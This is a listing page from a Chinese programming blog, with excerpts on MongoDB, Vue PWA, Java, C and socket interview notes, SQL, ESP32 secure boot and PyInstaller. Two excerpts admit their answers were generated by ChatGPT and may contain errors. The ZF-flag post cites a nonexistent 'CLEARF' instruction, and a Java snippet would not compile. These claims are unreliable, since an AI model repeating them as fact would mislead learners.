<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b7902a829ca6a053c8aad54d127b7c9/" rel="bookmark">
			Mongodb管道函数操作数组，过滤，数组截取，条件分支，字符串合并
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（学习的本质，不在于记住哪些知识，而在于它触发了你的思考——迈克尔·桑德尔） 假如有以下数据结构 其中features内value的数据结构是可变的
{ "_id": { "$oid": "64bd0b17258d09faf6ebb6ee" }, "id": { "id": "dania.mndz", "platform": "INSTAGRAM" }, "__v": 0, "createdAt": { "$date": "2022-08-05T06:42:18.673Z" }, "features": [ { "type": "SHARED_NICKNAME_AVATAR", "value": { "nickname": "Dania Mendez", "avatar": "https://cdn.hypeauditor.com/img/instagram/user/15148153672.jpg?w=320&amp;till=1697914801&amp;sign=96da71c49c59693daf2e033bcf70dba3" } } ], "updatedAt": { "$date": "2023-07-22T19:00:00.554Z" } } 对应的管道函数操作 [ { $match: { // 筛选日期 createdAt: { $lte: new Date(1690127999999), }, // 多个同时满足的条件 $and: [ { "features.type": "SHARED_EMAIL", }, // value字段必须存在 { "features.value": { $exists: true, }, }, // value字段不能为空字符串 { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b7902a829ca6a053c8aad54d127b7c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4df6832e60b0047e5be02c4e8d3148c/" rel="bookmark">
			Vue3引用PWA，vite-plugin-pwa的使用及注意要点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工作业务需求，需要给H5页面增加PWA功能，主要是需要有一键添加到桌面，而不是指引用户在浏览器工具栏操作。 查找了一些资料，主要是用到 Add to Home Screen，简称 A2HS，需要主要的是此方法只有部分浏览器支持，Mobile Chrome / Android Webview 从 31 版开始支持 A2HS，Opera for Android 从 32 版开始支持，Firefox for Android 从 58 版 (en-US) 开始支持。 Vue3+vite有个好用的插件 vite-plugin-pwa，只需要在vite.config.js做配置即可。 npm i vite-plugin-pwa -D // vite.config.js / vite.config.ts import { VitePWA } from 'vite-plugin-pwa' export default { plugins: [ VitePWA({ manifest: { name: 'PWA应用', short_name: 'PWA', description: 'PWA应用测试', theme_color: '#182330', icons: [	//添加图标， 注意路径和图像像素正确 { src: '/img/icon/icon_192.png', sizes: '192x192', type: 'image/png', }, ] }, registerType: 'autoUpdate', workbox: { globPatterns: ['**/*.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4df6832e60b0047e5be02c4e8d3148c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6e9563216334f41c347a2769a0202c0/" rel="bookmark">
			Java中的定时任务应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 使用Java的Timer import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Date; import java.util.Timer; import java.util.TimerTask; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; public class TimerUtil { public static void playOne() { new Timer("Timer1").schedule(new TimerTask() { @Override public void run() { System.out.println("TimerTask1"); } }, 1000, 2000); } public static void playTwo() throws ParseException { SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); Date date = simpleDateFormat.parse("2023-08-10 10:14:00"); new Timer("Timer2").scheduleAtFixedRate(new TimerTask() { @Override public void run() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6e9563216334f41c347a2769a0202c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bc10e9958b0f0dbd7b32b74cc9e5e58/" rel="bookmark">
			【C&#43;&#43;】C语言基础部分知识点总结 （指针，函数，内存，关键字，预处理等）（秋招篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言讲一下32位系统常用数据类型的字节大小（stm32f103为例）讲一些C/C++中常见的库什么是易变变量？代码的转化和构建通常会经历哪几个步骤：（预处理，编译，汇编，链接）介绍一下C/C++ 常用的关键字介绍一些const的使用方法#define const typedef三者区别链接的静态链接和动态链接分别是啥常见的预处理指令有哪些什么是类型检查？define预处理指令存在什么问题？面试中的#define 题 （让写几个标准宏函数）讲一下头文件中常见的#ifndef #endif举例介绍一下预处理指令#pragma举例介绍一下预处理指令#error讲一下静态变量和静态函数const结合静态变量和静态函数讲一下extern关键字指针的大小是？指针p++,其值怎么变化的介绍一下指针之间的加减法讲一下指针常量和常量指针的区别讲一下野指针和空指针，它们怎么发生的介绍一下函数指针介绍一下二级指针和应用场景字符串和字符数组的关系C/C++中参数传递的方式有几种？数组作为函数参数，有几种写法？do while(0)有何优势？swap(a,b)和swap(&amp;a,&amp;b)的区别i++ 和++i 的区别if ，if， if 和 if， else if， else 的区别介绍一下内联函数和宏函数，同时讲一下它们的区别介绍一下C语言和C++中IO流的函数讲一下typeid函数讲一下C++中的内存四区new和malloc函数用法介绍一下（函数原型和返回值等）讲一下 堆栈在各个方面的不同之处每个线程都有自己的栈空间对于一个函数而言 函数参数压栈的顺序是？讲一下内存泄漏和解决办法什么是内存对齐命名空间是干嘛的 常用的命名空间有哪些include&lt;&gt;和include""的区别 前言 秋招笔记汇总篇之C语言基础
笔者是拿chatgpt写的，所以可能部分答案存在一定出路（3.5版本GPT有些缺陷），大部分答案我是写完了之后校正过一遍，有出入的地方还望各位同学指出。
2023.8.7 首次更新
讲一下32位系统常用数据类型的字节大小（stm32f103为例） 1）8位数据类型：
uint8_t（无符号8位整数）：1字节
int8_t（有符号8位整数）：1字节
char：1字节
2）16位数据类型：
uint16_t（无符号16位整数）：2字节
int16_t（有符号16位整数）：2字节
uint_fast16_t：2字节
int_fast16_t：2字节
3）32位数据类型：
uint32_t（无符号32位整数）：4字节
int32_t（有符号32位整数）：4字节
uint_fast32_t：4字节
int_fast32_t：4字节
float：4字节
4）64位数据类型（通常不适用于 STM32F103）：
uint64_t（无符号64位整数）：8字节
int64_t（有符号64位整数）：8字节
uint_fast64_t：8字节
int_fast64_t：8字节
double：8字节
讲一些C/C++中常见的库 stdio.h：提供了标准输入输出函数，如printf和scanf。
stdlib.h：提供了一些常用的函数，如内存分配和释放函数malloc和free。
unistd.h：提供了对POSIX操作系统API的访问，包括进程控制、文件操作等。
string.h：提供了字符串操作函数，如字符串复制函数strcpy和字符串比较函数strcmp。
arpa/inet.h：提供了一些与网络编程相关的函数和数据结构，如IP地址转换函数inet_pton和inet_ntop。
（在Windows平台上，网络编程相关的功能通常由winsock2.h库提供）
什么是易变变量？ “易变变量”（volatile variable）是一个在编程中使用的修饰符，用于告诉编译器该变量可能在程序的执行过程中发生不可预测的变化，因此编译器不应该进行某些优化，以确保对变量的访问和操作的正确性。
在C和C++中，编译器通常会对变量进行优化，以提高代码的执行效率。然而，有些情况下，变量的值可能会在程序执行期间被外部因素改变，这种情况下编译器的优化可能会引发问题。例如：
1）硬件寄存器访问：当变量实际上是与硬件寄存器相关联的，寄存器的值可能会在程序执行期间发生变化，但编译器可能不知道这种情况。
2）多线程环境：在多线程环境中，一个线程可能会修改另一个线程使用的变量，但编译器可能无法检测到这种可能性。
3）中断处理：在嵌入式系统中，中断可能会随时修改变量的值，但编译器不一定能够识别这种情况。
通过将变量声明为 volatile，编译器会知道这个变量的值可能会在未经通知的情况下发生变化，因此它不会进行某些优化，比如将变量的值缓存在寄存器中而不是从内存中读取。
在C语言中，使用 volatile 关键字声明易变变量，例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bc10e9958b0f0dbd7b32b74cc9e5e58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad59b8a1893778c735cca8ae52171fa2/" rel="bookmark">
			Camera Sensor Driver Bring-up Guide
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3447fee7852eaf74bb4c347b51543fe/" rel="bookmark">
			SQL 字段拼接成新字段的方法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 文章目录 系列文章目录前言一、使用字符串连接操作符：二、使用字符串连接函数：三、使用字符串拼接函数：四、使用字符串加法运算符：总结 前言 在数据库查询和数据处理中，有时我们需要将表中的多个字段进行拼接，以生成新的字段。本文将介绍如何使用 SQL 查询语句来实现字段拼接，并将其结果作为新的字段返回，帮助你灵活处理和展示数据。
在 SQL 查询中，我们可以使用不同的方法将多个字段拼接成新的字段。下面介绍几种常见的方法：
一、使用字符串连接操作符： SELECT CONCAT(column1, ' ', column2) AS new_column FROM table_name; 在上述示例中，我们使用 CONCAT() 函数将 column1 和 column2 字段进行拼接，并使用 AS 关键字为拼接结果指定别名 new_column。
二、使用字符串连接函数： SELECT column1 || ' ' || column2 AS new_column FROM table_name; 上述查询使用 || 运算符实现字段拼接，将 column1 和 column2 字段连接起来，并将结果赋值给别名为 new_column 的新字段。
三、使用字符串拼接函数： SELECT CONCAT_WS(' ', column1, column2) AS new_column FROM table_name; 在上述查询中，我们使用 CONCAT_WS() 函数，其中第一个参数为拼接的分隔符（在示例中为’ '），后续参数为要拼接的字段，以此将多个字段连接为新的字段。
四、使用字符串加法运算符： SELECT column1 + ' ' + column2 AS new_column FROM table_name; 在某些数据库中，你也可以使用加法运算符 + 来进行字段拼接，类似于前面的示例。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3447fee7852eaf74bb4c347b51543fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b09b2b71ceabd81d6081dc69fec81da/" rel="bookmark">
			SpringBoot 将项目打包成 jar 包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot 将项目打包成 jar 包 一、项目打包成 jar 包 首先在 pom.xml 文件中导入 Springboot 的 maven 依赖 &lt;!-- 将应用打包成一个可以执行的 jar 包 --&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 在项目的生命周期中，package 一下
package 完成以后, target 中会生成一个. jar 包
package 完成后的 jar 包
找到对应的 jar 包路径下，java -jar 打包后的名字即可运行成功;
该 jar 包所在的路径下 cmd
java -jar 运行项目 启动成功
在控制台通过命令去改端口
例如: java -jar SpringBoot_Mybatis-0.0.1-SNAPSHOT.jar --server.port=8888
控制台更换端口为 8888 端口 8888 启动成功
2、通过命令行设置属性值 相信使用过一段时间Spring Boot的用户，一定知道这条命令: java -jar xxx.jar --server.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b09b2b71ceabd81d6081dc69fec81da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0d844369f336ec380e27a67f726b2a7/" rel="bookmark">
			谈谈项目中的策略模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 概要业务背景代码细节小结 概要 策略模式（Strategy Pattern）属于对象的行为模式。其用意是针对一组算法，将每一个算法封装到具有共同接口的独立的类中，从而使得它们可以相互替换。策略模式使得算法可以在不影响到客户端的情况下发生变化。
其主要目的是通过定义相似的算法，替换if else 语句写法，并且可以随时相互替换。
昨天和前端联调，去debug解决问题的时候，看见别人的代码里用到了设计模式，遂决定总结输出一下，毕竟学会了就是自己写的啦！
业务背景 在我们的客服系统中有一个板块是关于售后单的处理，我们对于售后单有如下操作：分配、同意、拒绝、跟进等。
在策略模式中，我们为这些方法提供了统一的入口，根绝前端传过来的策略枚举，我们能够去找到对应的策略实现。
代码细节 关于策略模式的基本demo网上有很多这里就不再赘述。不了解的同学也可以先看看这篇策略模式详解
前端为我们提供一个策略选择，比如“分配”，那么在传过来的body中便会带上“assign”这个，根据此我们可以在后端中找到对应的实现，关于字符串到具体实现类的映射我们可以用一个map保存。在上面我分享的文章当中，作者提到一种方案采用static静态代码块，个人认为这种方案的缺陷，如果我新增了一个策略实现，那么我还得在静态代码块中添加相应映射，同时作者还提供了交由spring创建的方式。
无独有偶，在我们的项目中，也是采用了spring创建的方式，不过具体实现略有不同
static { payStrategies.put(PayTypeEnum.WX, new WxPayment()); payStrategies.put(PayTypeEnum.ALIPAY, new AlipayPayment()); payStrategies.put(PayTypeEnum.BANK_CARD, new BankCardPayment()); } 可以看到，我们将RefundOperateContext这个类交由spring去管理，那么在项目启动初始化时，spring会去调用此类的构造函数。可是这里的入参Map&lt;String, RefundStrategy&gt; strategyMap是从哪里获取的呢
@Service public class RefundOperateContext { private final Map&lt;String, RefundStrategy&gt; strategyMap = new ConcurrentHashMap&lt;&gt;(); public RefundOperateContext(Map&lt;String, RefundStrategy&gt; strategyMap) { this.strategyMap.clear(); strategyMap.forEach((k, v) -&gt; this.strategyMap.put(k, v)); } public boolean handle(String poolId, AfterSaleOrderOperateSO afterSaleOrderOperateSO) { return strategyMap.get(poolId).strategy(afterSaleOrderOperateSO); } } 秘密便在于这里，DefaultListableBeanFactory中的findAutowireCandidates会查找匹配Spring容器中的所有同类型Bean实例，也就是我们提供的策略接口的所有实现都会匹配到。
BeanFactoryUtils.beanNamesForTypeIncludingAncestors可以拿到一个beanName数组，通过遍历数组就能拿到对应的策略接口的实现引用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0d844369f336ec380e27a67f726b2a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d2e24ab815bd3b48789863117d8eb0b/" rel="bookmark">
			【网络编程】网络编程知识点总结 | socket通信，多进程，多线程，IO复用 ，线程池等 （秋招篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 UDP也需要端口号基于TCP的socket通信中，简易服务端的六步依次为？基于TCP的socket通信中，简易客户端的四步依次为？介绍一下在linux环境下，服务器这六步的使用到的一些函数（参数，返回值类型等）介绍一下在linux环境下，简易客户端这六步的使用到的一些函数（参数，返回值类型等）一对简易的TCP服务器和客户端程序TCP数据传输不存在边界是什么意思，UDP为何存在数据边界简易UDP服务器和客户端用到了哪些和TCP不同的函数？一对简易的UDP服务器和客户端程序优雅地断开套接字连接 是什么意思 相比之下什么是不优雅的？介绍一下半关闭，他和普通关闭有何区别？window和linux上网络通信主要函数的一些区别（了解即可）TCP不支持多播和广播讲一下C/S架构 和B/S架构介绍一下进程的创建，用到哪个函数？多进程实现并发服务器讲一下进程间通信方式有哪些？介绍一下线程相关的主要函数，及其函数原型返回值等（创建，回收，退出，分离等）线程同步是什么意思 为何要线程同步 竞态是啥常见的线程同步机制有哪些介绍一下互斥锁实现线程同步的相关函数介绍一下条件变量实现线程同步的相关函数介绍一下信号量实现线程同步的相关函数介绍一下读写锁线程同步的相关函数互斥锁和读写锁的区别多线程实现并发服务器IO复用有哪些方式？介绍一下IO复用的select介绍一下IO复用的poll介绍一下IO复用的epoll分析一下select poll epoll三者优缺点介绍一下Reactor和proactor 秋招笔记汇总篇之Linux网络编程
笔者是拿chatgpt写的，所以可能部分答案存在一定出路（3.5版本GPT有些缺陷），有出入的地方还望各位同学指出。
参考教材：TCP/IP网络编程
2023.8.9 首次更新,有些内容未完成会持续更新
UDP也需要端口号 UDP（用户数据报协议）也需要端口号来实现通信。端口号是一个16位的数字，用于标识应用程序或服务在计算机上的特定通信端口。在UDP通信中，数据通过UDP数据包发送和接收。
基于TCP的socket通信中，简易服务端的六步依次为？ 1）创建套接字（Socket）：
使用 socket() 函数创建一个套接字，并指定地址族（例如，IPv4或IPv6）和套接字类型（例如，TCP套接字）。
2）绑定套接字到本地地址和端口：
使用 bind() 函数将套接字绑定到一个本地的IP地址和端口号，用于监听客户端的连接请求。
3）监听连接请求：
使用 listen() 函数将套接字设置为监听状态，指定服务器同时处理的最大连接请求排队数量。
4）接受客户端连接请求：
使用 accept() 函数接受客户端的连接请求，该函数会阻塞程序执行，直到有客户端连接进来。一旦有连接请求，accept() 函数会返回一个新的套接字，通过这个套接字可以与客户端进行通信。
5）与客户端进行通信：
通过新的套接字，服务端可以与客户端进行数据交换，使用 recv() 函数接收客户端发送的数据，使用 send() 函数向客户端发送数据。
6）关闭套接字：
在通信完成后，使用 close() 函数关闭服务端与客户端的套接字连接。如果需要继续监听其他客户端的连接，可以回到第 4 步。
基于TCP的socket通信中，简易客户端的四步依次为？ 基于TCP的Socket通信中，客户端的四个步骤依次为：
1）创建Socket：客户端创建一个套接字（Socket），用于与服务端建立连接。
2）建立连接：客户端通过套接字连接到指定的服务器IP地址和端口号。
3）发送数据：连接建立后，客户端可以使用套接字发送数据给服务端。
4）接收数据：客户端可以通过套接字接收服务端发送的数据，以进行双向通信。
介绍一下在linux环境下，服务器这六步的使用到的一些函数（参数，返回值类型等） 在传统的C语言中，基于TCP的Socket通信的函数原型可以分为以下几个主要函数：
1）socket 函数：
int socket(int domain, int type, int protocol); 这个函数用于创建一个新的套接字，并返回一个文件描述符（socket descriptor）。参数 domain 指定套接字使用的地址族，常见的有 AF_INET 表示IPv4地址族，AF_INET6 表示IPv6地址族。参数 type 指定套接字的类型，常见的有 SOCK_STREAM 表示TCP套接字，SOCK_DGRAM 表示UDP套接字。参数 protocol 通常设置为0，表示使用默认的协议。（当protocol参数设置为0时，socket函数会根据第二个参数（socket类型）自动选择合适的协议。对于SOCK_STREAM类型的套接字，会选择TCP协议；对于SOCK_DGRAM类型的套接字，会选择UDP协议。除此之外还有IPPROTO_TCP，IPPROTO_UDP，IPPROTO_SCTP等参数选项，分别代表TCP协议，UDP协议，SCTP协议）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d2e24ab815bd3b48789863117d8eb0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0870034a210483765c5fa4dfff37ad2/" rel="bookmark">
			推荐一个几何计算相关的网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Geometric Tools
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63017f1cd399c1e4a6e38941726328b6/" rel="bookmark">
			计算机系统：深入解析ZF标志位（Zero Flag）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机系统：深入解析ZF标志位（Zero Flag） 引言 在计算机系统中，ZF（Zero Flag）标志位是处理器状态寄存器中的一个重要标志位。它用于记录上一条指令运算结果中是否存在零值。本文将全面探讨ZF标志位的作用、使用场景以及相关实现细节。
1. ZF标志位的定义与作用 ZF标志位是处理器状态寄存器中的一个标志位，它的值由处理器根据指令执行结果自动设置或清除。ZF标志位用于记录上一条指令运算结果是否为零。当上一条指令的运算结果为零时，ZF被置位（1），否则清零（0）。
2. ZF标志位的使用场景 ZF标志位在很多条件分支指令以及比较指令中起着关键作用。下面列举了几个常见的使用场景：
2.1 条件分支 在条件分支指令（如JZ、JNZ等）中，ZF标志位的值决定了跳转的条件。当ZF为1时，表示上一条指令的运算结果为零，跳转条件成立；当ZF为0时，表示上一条指令的运算结果不为零，跳转条件不成立。
2.2 比较指令 在比较指令（如CMP）中，ZF标志位用于记录两个操作数的比较结果。如果两个操作数相等，则ZF被置位（1）；如果两个操作数不相等，则ZF清零（0）。
2.3 循环控制 在循环控制语句（如LOOP、LOOPZ等）中，ZF标志位通常与计数器配合使用。当ZF为1时，表示上一次循环后的计算结果为零，继续执行循环；当ZF为0时，表示计算结果不为零，跳出循环。
3. ZF标志位的实现细节 具体的处理器架构可能会有所不同，但大多数处理器都采用类似的方式来实现ZF标志位。下面简单介绍一种常见的实现方法：
3.1 运算结果生成 在执行指令的运算操作后，处理器会根据运算结果生成ZF标志位的值。常见的运算结果类型包括算术运算、逻辑运算、位移运算等。
3.2 ZF标志位设置 根据运算结果生成的值，处理器会将相应的位设置到ZF标志位上。一般情况下，如果运算结果为零，则将ZF标志位置位（1）；否则清零（0）。
3.3 ZF标志位清除 除了根据运算结果设置ZF标志位的值外，有些指令还可以显式地清除ZF标志位。这通常是通过特定的指令来实现的，例如CLEARF指令。
结论 ZF标志位作为处理器状态寄存器中的一个标志位，在计算机系统中具有重要的作用。它用于记录上一条指令运算结果中是否存在零值，并在条件分支、比较和循环控制等场景下发挥关键作用。实现ZF标志位的方式与具体的处理器架构有关，但一般都会根据运算结果自动设置或清除ZF标志位的值。
本文对ZF标志位的定义、作用、使用场景以及实现细节进行了详细解析。希望读者通过本文的介绍，对ZF标志位有更深入的理解和认识。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d73b4d57d0ad12a160be5db2ec29fc89/" rel="bookmark">
			【解决方案记录】Could not find com.android.tools.build:gradle:8.0.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 问题描述解决方法参考链接 问题描述 问题：在使用ORB-SLAM3的安卓端移植提供的项目进行配置时，
修改gradle目录下的gradle-wrapper.properties文件中的distributionUrl指向内容，将其改为了
https\://services.gradle.org/distributions/gradle-8.0-bin.zip 而后修改build.gradle文件中的内容，将dependencies后改为
classpath "com.android.tools.build:gradle:8.0" 重新进行gradle项目导入时，出现错误：
Could not find com.android.tools.build:gradle:8.0. 解决方法 版本错误，gradle实际的版本号应该为8.0.0（虽然文件夹什么的都写的8.0,）
将
classpath "com.android.tools.build:gradle:8.0" 修改为
classpath "com.android.tools.build:gradle:8.0.0" 即可
即为：
buildscript { repositories { google() mavenCentral() } dependencies { classpath "com.android.tools.build:gradle:8.0.0" // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files } } 参考链接 灵感来源：意识到版本号错误的来源
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0eb6fa6af088d46f6b9b14b2a6a21022/" rel="bookmark">
			ESP32开发阶段启用 Secure Boot 与 Flash encryption
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Secure Boot 与 Flash encryption详情
请参考：https://blog.csdn.net/espressif/article/details/79362094
1、开发环境 AT版本：2.4.0.0 发布IDF 与 python： idf4.3_py3.10_env系统：虚拟机 + ubuntu 20 2、使能 secure boot 和 flash encrypt ./build.py menuconfig 3、单独编译bootloader生成 secure boot key ./build.py bootloader 4、使用 key 和 bootloader 计算 带 digest 的 bootloader python $IDF_PATH/components/esptool_py/esptool/espsecure.py digest_secure_bootloader --keyfile ./build/bootloader/secure-bootloader-key-256.bin -o ./build/bootloader/bootloader_with_digest.bin ./build/bootloader/bootloader.bin 5、编译 partition_table 与 app ./build.py partition_table ./build.py app 6、加密三个 bin 文件 build/bootloader/bootloader_with_digest.bin
build/partition_table/partition-table.bin
build/esp-at.bin
export IDF_PATH=/home/henry/esp/esp-at/esp-idf //不同版本不一样我的这个版本是flash_encryption_key.bin，有的版本是flash_encrypt_key.bin python $IDF_PATH/components/esptool_py/esptool/espsecure.py encrypt_flash_data --keyfile flash_encryption_key.bin --address 0x0 -o build/bootloader/bootloader_with_digest_encrypt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0eb6fa6af088d46f6b9b14b2a6a21022/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/258d22fb1c18cc9ef2d649ed26dcf792/" rel="bookmark">
			java编程规范
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、时间格式为什么有大写有小写呢？ new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 为了区分月份和分钟，用大写M代表月份，小写m代表分钟
而大写的H代表24小时制，小写h代表12小时制
二、下面的程序判断等值的方式，使用那种最合适呢？ public class Hello { public static void main(String[] args) { String year = "2023"; // 方式1 System.out.println("2023".equals(year)); // 方式2 System.out.println(year.equals("2023")); } } 方式1是最合适的，当year为null值的时候，方式2就会报空指针异常，而方式1不会
public class Hello { public static void main(String[] args) { String year = null; // 方式1 System.out.println("2023".equals(year)); // 方式2 System.out.println(year.equals("2023")); } } 三、编程相关的命名不单要求正确，还需要规范 1、命名可以使用ali / alibaba / taobao / cainiao / aliyun / youku / hangzhou 等国际通用的名称，但不应该使用niHao（你好）、youhui（优惠）等拼音，更不允许直接使用中文表示
2、规范使用驼峰命名，类名第一个字母要求大写，而方法名、变量名第一个字母要求小写，常量名要求全部大写，中间的单词用下划线分隔
3、包名统一使用小写，原则上只能是一个单词，例如一个包，com.wu.util，每个单词由点号分隔
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/258d22fb1c18cc9ef2d649ed26dcf792/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de09b155cca5220158ba2476c02b27c7/" rel="bookmark">
			json格式字符串的list集合转list对象集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一 //模拟json格式集合字符串
String code = "[{"age":0,"jid":"0","name":"0"},{"age":1,"jid":"1","name":"1"},{"age":2,"jid":"2","name":"2"},{"age":3,"jid":"3","name":"3"},{"age":4,"jid":"4","name":"4"},{"age":5,"jid":"5","name":"5"},{"age":6,"jid":"6","name":"6"},{"age":7,"jid":"7","name":"7"},{"age":8,"jid":"8","name":"8"},{"age":9,"jid":"9","name":"9"}]";
//转对象集合
List&lt;User&gt; list = JSONArray.toList(JSONArray.fromObject(code, User.class);
方法二(推荐使用) 使用com.alibaba.fastjson.JSON; &lt;dependency&gt;
&lt;groupId&gt;com.alibaba&lt;/groupId&gt;
&lt;artifactId&gt;fastjson&lt;/artifactId&gt;
&lt;version&gt;1.2.9&lt;/version&gt;
&lt;/dependency&gt;
案例使用
//code是集合字符串
List&lt;User&gt; list = JSON.parseArray(code, User.class);
指定泛型直接转List&lt;T&gt;:
//引入的包分别是: import com.fasterxml.jackson.core.type.TypeReference; import com.fasterxml.jackson.databind.ObjectMapper; ObjectMapper mapper = new ObjectMapper(); List list = xxx.getXxx(); List&lt;User&gt; users = mapper.convertValue(list, new TypeReference&lt;List&lt;User&gt;&gt;() { }); 总结 使用方法一存在问题:转实体的属性必须与目标实体一一对应,局限
使用方法二:转实体属性不需要与目标实体一一对应,实体有的字段就会对应上,没有的不会报错
推荐使用二
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7296369235371ae40f670b10470db741/" rel="bookmark">
			【pyinstaller】简介与基础命令汇总（更新中）:打包后的main.exe出现闪退的现象, ModuleNotFoundError: No module named
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、简介与快速使用1.1 简介1.2 安装与快速使用 二、基础命令2.1 概述2.2 基础的命令 三、问题汇总3.1 打包后的main.exe出现闪退的现象3.2 ModuleNotFoundError: No module named 'mmcv._ext' 一、简介与快速使用 1.1 简介 PyInstaller将Python应用程序及其所有依赖项打包到一个package中。用户可以在不安装Python解释器或任何模块的情况下运行打包后的应用，这样可以方便传递。PyInstaller支持Python 3.7及更新的版本，并可以正确打包了许多主要的Python包，如numpy、matplotlib、PyQt、wxPython等（但有些Python的第三方库打包过程中可能存在问题，详见问题汇总）。Pyinstaller可以在Windows、Mac OS X和Linux上使用，但是并不是跨平台的，也就是说要打包为windows应用（.exe文件），需要在Windows系统上使用Pyinstaller。 1.2 安装与快速使用 安装： pip install pyinstaller 基本使用：打开command prompt/shell window，并通过cd命令定位到PyQt5的主程序所在的位置，然后通过以下命令构建，那么打包后的应用可以在dist文件中使用 pyinstaller your_program.py 二、基础命令 2.1 概述 